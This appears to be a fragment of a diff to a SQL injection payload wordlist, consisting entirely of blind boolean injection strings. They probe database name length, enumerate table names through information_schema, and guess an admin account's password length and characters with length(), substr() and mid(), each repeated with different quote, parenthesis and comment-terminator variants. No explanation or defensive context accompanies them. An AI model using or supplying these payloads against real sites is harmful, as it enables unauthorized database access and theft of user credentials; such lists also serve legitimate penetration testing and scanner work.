-")) or length(database())=20 /*"
 ")) or length(database())=1 -+"
-")) or length(database())=2 -+"
-")) or length(database())=3 -+"
-")) or length(database())=4 -+"
-")) or length(database())=5 -+"
-")) or length(database())=6 -+"
-")) or length(database())=7 -+"
-")) or length(database())=8 -+"
-")) or length(database())=9 -+"
-")) or length(database())=10 -+"
-")) or length(database())=11 -+"
-")) or length(database())=12 -+"
-")) or length(database())=13 -+"
-")) or length(database())=14 -+"
-")) or length(database())=15 -+"
-")) or length(database())=16 -+"
-")) or length(database())=17 -+"
-")) or length(database())=18 -+"
-")) or length(database())=19 -+"
-")) or length(database())=20 -+"
 ")) or length(database())=1 *-"
-")) or length(database())=2 *-"
-")) or length(database())=3 *-"
-")) or length(database())=4 *-"
-")) or length(database())=5 *-"
-")) or length(database())=6 *-"
-")) or length(database())=7 *-"
-")) or length(database())=8 *-"
-")) or length(database())=9 *-"
-")) or length(database())=10 *-"
-")) or length(database())=11 *-"
-")) or length(database())=12 *-"
-")) or length(database())=13 *-"
-")) or length(database())=14 *-"
-")) or length(database())=15 *-"
-")) or length(database())=16 *-"
-")) or length(database())=17 *-"
-")) or length(database())=18 *-"
-")) or length(database())=19 *-"
-")) or length(database())=20 *-"
+" or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1--"
+" or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 #"
+" or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 /-"
+" or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 /*"
+" or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 -+"
+" or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 *-"
+") or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1--"
+") or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 #"
+") or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 /-"
+") or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 /*"
+") or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 -+"
+") or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 *-"
+")) or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1--"
+")) or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 #"
+")) or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 /-"
+")) or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 /*"
+")) or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 -+"
+")) or length((select table_name from information_schema.tables where table_schema="table name" limit 0,1))=1 *-"
+" or id="admin" and length(pw)=1--"
+" or id="admin" and length(pw)=1 #"
+" or id="admin" and length(pw)=1 /-"
+" or id="admin" and length(pw)=1 /*"
+" or id="admin" and length(pw)=1 -+"
+" or id="admin" and length(pw)=1 *-"
+") or id="admin" and length(pw)=1--"
+") or id="admin" and length(pw)=1 #"
+") or id="admin" and length(pw)=1 /-"
+") or id="admin" and length(pw)=1 /*"
+") or id="admin" and length(pw)=1 -+"
+") or id="admin" and length(pw)=1 *-"
+")) or id="admin" and length(pw)=1--"
+")) or id="admin" and length(pw)=1 #"
+")) or id="admin" and length(pw)=1 /-"
+")) or id="admin" and length(pw)=1 /*"
+")) or id="admin" and length(pw)=1 -+"
+")) or id="admin" and length(pw)=1 *-"
+admin" or length(pw)=1--"
+admin" or length(pw)=1 #"
+admin" or length(pw)=1 /-"
+admin" or length(pw)=1 /*"
+admin" or length(pw)=1 -+"
+admin" or length(pw)=1 *-"
+admin") or length(pw)=1--"
+admin") or length(pw)=1 #"
+admin") or length(pw)=1 /-"
+admin") or length(pw)=1 /*"
+admin") or length(pw)=1 -+"
+admin") or length(pw)=1 *-"
+admin")) or length(pw)=1--"
+admin")) or length(pw)=1 #"
+admin")) or length(pw)=1 /-"
+admin")) or length(pw)=1 /*"
+admin")) or length(pw)=1 -+"
+admin")) or length(pw)=1 *-"
+" or substr(database(),1,1)="a"--"
+" or substr(database(),1,1)="a" #"
+" or substr(database(),1,1)="a" /-"
+" or substr(database(),1,1)="a" /*"
+" or substr(database(),1,1)="a" -+"
+" or substr(database(),1,1)="a" *-"
+") or substr(database(),1,1)="a"--"
+") or substr(database(),1,1)="a" #"
+") or substr(database(),1,1)="a" /-"
+") or substr(database(),1,1)="a" /*"
+") or substr(database(),1,1)="a" -+"
+") or substr(database(),1,1)="a" *-"
+")) or substr(database(),1,1)="a"--"
+")) or substr(database(),1,1)="a" #"
+")) or substr(database(),1,1)="a" /-"
+")) or substr(database(),1,1)="a" /*"
+")) or substr(database(),1,1)="a" -+"
+")) or substr(database(),1,1)="a" *-"
+" or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a"--"
+" or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" #"
+" or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /-"
+" or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /*"
+" or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" -+"
+" or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" *-"
+") or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a"--"
+") or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" #"
+") or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /-"
+") or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /*"
+") or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" -+"
+") or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" *-"
+")) or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a"--"
+")) or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" #"
+")) or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /-"
+")) or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /*"
+")) or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" -+"
+")) or substr((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" *-"
+" or id="admin" and substr(pw,1,1)="a"--"
+" or id="admin" and substr(pw,1,1)="a" #"
+" or id="admin" and substr(pw,1,1)="a" /-"
+" or id="admin" and substr(pw,1,1)="a" /*"
+" or id="admin" and substr(pw,1,1)="a" -+"
+" or id="admin" and substr(pw,1,1)="a" *-"
+") or id="admin" and substr(pw,1,1)="a"--"
+") or id="admin" and substr(pw,1,1)="a" #"
+") or id="admin" and substr(pw,1,1)="a" /-"
+") or id="admin" and substr(pw,1,1)="a" /*"
+") or id="admin" and substr(pw,1,1)="a" -+"
+") or id="admin" and substr(pw,1,1)="a" *-"
+")) or id="admin" and substr(pw,1,1)="a"--"
+")) or id="admin" and substr(pw,1,1)="a" #"
+")) or id="admin" and substr(pw,1,1)="a" /-"
+")) or id="admin" and substr(pw,1,1)="a" /*"
+")) or id="admin" and substr(pw,1,1)="a" -+"
+")) or id="admin" and substr(pw,1,1)="a" *-"
+admin" or substr(pw,1,1)="a"--"
+admin" or substr(pw,1,1)="a" #"
+admin" or substr(pw,1,1)="a" /-"
+admin" or substr(pw,1,1)="a" /*"
+admin" or substr(pw,1,1)="a" -+"
+admin" or substr(pw,1,1)="a" *-"
+admin") or substr(pw,1,1)="a"--"
+admin") or substr(pw,1,1)="a" #"
+admin") or substr(pw,1,1)="a" /-"
+admin") or substr(pw,1,1)="a" /*"
+admin") or substr(pw,1,1)="a" -+"
+admin") or substr(pw,1,1)="a" *-"
+admin")) or substr(pw,1,1)="a"--"
+admin")) or substr(pw,1,1)="a" #"
+admin")) or substr(pw,1,1)="a" /-"
+admin")) or substr(pw,1,1)="a" /*"
+admin")) or substr(pw,1,1)="a" -+"
+admin")) or substr(pw,1,1)="a" *-"
+" or mid(database(),1,1)="a"--"
+" or mid(database(),1,1)="a" #"
+" or mid(database(),1,1)="a" /-"
+" or mid(database(),1,1)="a" /*"
+" or mid(database(),1,1)="a" -+"
+" or mid(database(),1,1)="a" *-"
+") or mid(database(),1,1)="a"--"
+") or mid(database(),1,1)="a" #"
+") or mid(database(),1,1)="a" /-"
+") or mid(database(),1,1)="a" /*"
+") or mid(database(),1,1)="a" -+"
+") or mid(database(),1,1)="a" *-"
+")) or mid(database(),1,1)="a"--"
+")) or mid(database(),1,1)="a" #"
+")) or mid(database(),1,1)="a" /-"
+")) or mid(database(),1,1)="a" /*"
+")) or mid(database(),1,1)="a" -+"
+")) or mid(database(),1,1)="a" *-"
+" or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a"--"
+" or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" #"
+" or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /-"
+" or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /*"
+" or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" -+"
+" or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" *-"
+") or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a"--"
+") or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" #"
+") or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /-"
+") or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /*"
+") or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" -+"
+") or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" *-"
+")) or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a"--"
+")) or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" #"
+")) or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /-"
+")) or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" /*"
+")) or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" -+"
+")) or mid((select table_name from information_schema.tables where table_schema="table name" limit 0,1),1,1)="a" *-"
+" or id="admin" and mid(pw,1,1)="a"--"
+" or id="admin" and mid(pw,1,1)="a" #"
+" or id="admin" and mid(pw,1,1)="a" /-"
+" or id="admin" and mid(pw,1,1)="a" /*"
+" or id="admin" and mid(pw,1,1)="a" -+"
+" or id="admin" and mid(pw,1,1)="a" *-"
+") or id="admin" and mid(pw,1,1)="a"--"
+") or id="admin" and mid(pw,1,1)="a" #"
+") or id="admin" and mid(pw,1,1)="a" /-"
+") or id="admin" and mid(pw,1,1)="a" /*"
+") or id="admin" and mid(pw,1,1)="a" -+"
+") or id="admin" and mid(pw,1,1)="a" *-"
+")) or id="admin" and mid(pw,1,1)="a"--"
+")) or id="admin" and mid(pw,1,1)="a" #"
+")) or id="admin" and mid(pw,1,1)="a" /-"
+")) or id="admin" and mid(pw,1,1)="a" /*"
+")) or id="admin" and mid(pw,1,1)="a" -+"
+")) or id="admin" and mid(pw,1,1)="a" *-"
+admin" or mid(pw,1,1)="a"--"
+admin" or mid(pw,1,1)="a" #"
+admin" or mid(pw,1,1)="a" /-"
+admin" or mid(pw,1,1)="a" /*"
+admin" or mid(pw,1,1)="a" -+"
+admin" or mid(pw,1,1)="a" *-"
+admin") or mid(pw,1,1)="a"--"
+admin") or mid(pw,1,1)="a" #"
+admin") or mid(pw,1,1)="a" /-"
+admin") or mid(pw,1,1)="a" /*"
+admin") or mid(pw,1,1)="a" -+"
+admin") or mid(pw,1,1)="a" *-"
+admin")) or mid(pw,1,1)="a"--"
+admin")) or mid(pw,1,1)="a" #"
+admin")) or mid(pw,1,1)="a" /-"
+admin")) or mid(pw,1,1)="a" /*"
+admin")) or mid(pw,1,1)="a" -+"
+admin")) or mid(pw,1,1)="a" *-"
 ```
